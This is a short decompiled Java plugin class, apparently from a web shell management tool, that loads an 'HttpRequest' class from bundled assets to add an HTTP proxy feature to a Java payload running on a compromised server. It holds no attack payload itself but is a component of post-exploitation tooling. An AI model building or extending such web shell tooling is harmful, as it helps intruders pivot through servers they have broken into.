/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.imp.Plugin;
import core.shell.ShellEntity;
import java.io.IOException;
import java.io.InputStream;
import javax.swing.JPanel;
import shells.plugins.generic.HttpProxy;
import util.functions;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="HttpProxy", DisplayName="Http\u4ee3\u7406")
public class JHttpProxy
extends HttpProxy
implements Plugin {
    private static final String CLASS_NAME = "plugin.HttpRequest";

    @Override
    public byte[] readPlugin() throws IOException {
        InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.classs", "HttpRequest"));
        byte[] data = functions.readInputStream(inputStream);
        inputStream.close();
        return data;
    }

    @Override
    public String getClassName() {
        return CLASS_NAME;
    }

    @Override
    public void init(ShellEntity shellEntity) {
        super.init(shellEntity);
    }

    @Override
    public JPanel getView() {
        return super.getView();
    }
}

